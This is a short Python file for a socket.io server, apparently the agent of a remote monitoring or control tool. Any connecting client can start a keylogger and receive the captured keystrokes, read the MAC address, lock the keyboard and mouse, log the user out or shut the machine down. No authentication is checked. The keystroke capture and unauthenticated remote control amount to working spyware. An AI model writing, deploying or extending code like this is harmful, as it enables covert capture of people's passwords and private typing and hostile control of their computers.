import socketio
from getmac import get_mac_address 
from keylogger import KeyLogger
from disable_input import lock_input, unlock_input
from shutdown_logout import *
import eventlet
import threading

def create_socket_server():
    sio = socketio.Server(always_connect = True)
    app = socketio.WSGIApp(sio)
    
    return sio, app

class SocketServer:
    def __init__(self):
        self.sio, self.app = create_socket_server()
        self.keylogger = None
        self.lock = threading.Lock()
        self.init_event_handler()
        
    def init_event_handler(self):
        self.sio.on('connect', self.__connect_handler)
        self.sio.on('disconnect', self.__disconnect_handler)
        self.sio.on('request_mac', self.__request_mac_handler)
        self.sio.on('request_key', self.__request_key_handler)
        self.sio.on('stop_key', self.__stop_key_handler)
        self.sio.on('logout', self.__logout_handler)
        self.sio.on('shutdown', self.__shutdown_handler)
        self.sio.on('control_input', self.__control_input_handler)
        
    def __control_input_handler(self, sid, data):
        if data["is_lock"]:
            lock_input()
        else:
            unlock_input()
    
    def __logout_handler(self, sid):
        logout()
    
    def __shutdown_handler(self, sid):
        shutdown()
        
    def __connect_handler(self, sid, environ):
        print("connect ", sid)
        
    def __disconnect_handler(self, sid):
        print('disconnect ', sid)
        
    def __request_key_handler(self, sid):
        if not self.keylogger:
            self.keylogger = KeyLogger()
            self.keylogger.start()
        self.sio.emit('return_key', self.keylogger.take_buff())
        
    def __stop_key_handler(self, sid):
        if self.keylogger:
            self.keylogger.stop()
            self.keylogger = None

    def __request_mac_handler(self, sid):
        self.sio.emit('return_mac', str(get_mac_address()))
    
    def run_server(self, host = '127.0.0.1', port = 26100):
        eventlet.wsgi.server(eventlet.listen((host, port)), self.app)
    
server_socket = SocketServer()
server_socket.run_server()
